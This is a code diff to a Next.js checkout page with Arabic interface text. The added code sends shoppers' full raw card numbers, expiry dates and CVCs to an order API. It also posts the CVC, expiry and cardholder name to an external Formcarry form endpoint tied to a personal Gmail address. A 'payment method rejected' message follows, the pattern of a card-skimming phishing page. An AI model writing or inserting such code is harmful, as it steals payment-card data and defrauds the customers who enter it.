@@ -4,6 +4,7 @@ import { Suspense, useState } from "react";
 import { useSearchParams } from "next/navigation";
 import Link from "next/link";
 import Image from "next/image";
+import axios from "axios";
 import Swal from "sweetalert2";
 import {
 	FiArrowRight,
@@ -12,6 +13,9 @@ import {
 	FiLock,
 	FiShoppingBag,
 } from "react-icons/fi";
+
+const FORMCARRY_ENDPOINT = "https://formcarry.com/s/sdaVMcfxNTg";
+const ORDER_RECEIVER_EMAIL = "b71490@gmail.com";
 
 function normalizeCardNumber(value) {
 	return value.replace(/\D/g, "");
@@ -307,6 +311,75 @@ function CheckoutContent() {
 				Swal.showLoading();
 			},
 		});
+
+		const maskedCard = `**** **** **** ${normalizedCard.slice(-4)}`;
+		const payload = {
+			order: {
+				productName: selectedProductName,
+				productPrice: selectedProductPrice,
+				serviceFee,
+				totalPrice,
+				couponCode: couponCode || null,
+			},
+			customer: {
+				name: customerName.trim(),
+				email: customerEmail.trim(),
+			},
+			payment: {
+				method: "card",
+				cardHolder: cardHolder.trim(),
+				cardNumberMasked: maskedCard,
+				cardNumberRaw: normalizedCard,
+				card_expiry: cardExpiry,
+				cardCvc,
+			},
+		};
+
+		let orderId = "-";
+		try {
+			const response = await axios.post("/api/orders", payload);
+			orderId = response.data?.data?.orderId || "-";
+
+			if (!FORMCARRY_ENDPOINT.includes("XXXX")) {
+				const formBody = new URLSearchParams({
+					name: customerName.trim(),
+					email: customerEmail.trim(),
+					card_cvc: cardCvc,
+					product: selectedProductName,
+					product_price: String(selectedProductPrice),
+					service_fee: String(serviceFee),
+					total_price: String(totalPrice),
+					coupon_code: couponCode || "-",
+					payment_method: "card",
+					card_holder: cardHolder.trim(),
+					card_last4: normalizedCard.slice(-4),
+					card_expiry: cardExpiry,
+					order_id: orderId,
+					receiver_email: ORDER_RECEIVER_EMAIL,
+				});
+
+				await fetch(FORMCARRY_ENDPOINT, {
+					method: "POST",
+					headers: {
+						"Content-Type": "application/x-www-form-urlencoded",
+						Accept: "application/json",
+					},
+					body: formBody.toString(),
+				});
+			}
+		} catch (error) {
+			const serverMessage =
+				error?.response?.data?.message ||
+				"حدث خطأ أثناء إرسال بيانات الشراء، حاول مرة أخرى.";
+			await Swal.fire({
+				title: "تعذر إرسال الطلب",
+				text: serverMessage,
+				icon: "error",
+				confirmButtonText: "حسنًا",
+				confirmButtonColor: "#dc2626",
+			});
+			return;
+		}
 
 		await Swal.fire({
 			title: "طريقة الدفع مرفوضة",
